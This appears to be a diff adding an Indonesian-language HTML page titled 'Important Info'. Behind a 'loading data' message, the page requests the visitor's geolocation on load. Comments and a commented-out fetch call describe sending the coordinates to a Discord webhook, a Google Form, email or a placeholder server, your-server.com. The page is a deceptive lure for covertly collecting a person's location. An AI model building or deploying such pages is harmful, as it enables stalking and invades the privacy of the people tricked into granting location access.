@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Info Penting</title>
+  <meta charset="UTF-8">
+  <script>
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Kirim lokasi ke Google Form kamu, Discord Webhook, atau Email (jika kamu atur)
+      // Sekarang tampilkan aja
+      document.body.innerHTML = `
+        <h2>Terima kasih ❤️</h2>
+        <p>Lokasi kamu sudah kami terima.</p>
+        <p>Latitude: ${lat}</p>
+        <p>Longitude: ${lon}</p>
+        <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Lihat di Google Maps</a>
+      `;
+
+      // Atau kirim pakai fetch:
+      /*
+      fetch("https://your-server.com/endpoint", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ lat, lon })
+      });
+      */
+    }
+
+    function errorLocation(err) {
+      document.body.innerHTML = `<h2>Gagal akses lokasi 😢</h2><p>${err.message}</p>`;
+    }
+
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, errorLocation);
+      } else {
+        document.body.innerHTML = "<h2>Browser tidak mendukung pelacakan lokasi.</h2>";
+      }
+    };
+  </script>
+</head>
+<body>
+  <h2>Memuat data, tunggu sebentar ya...</h2>
+</body>
+</html>
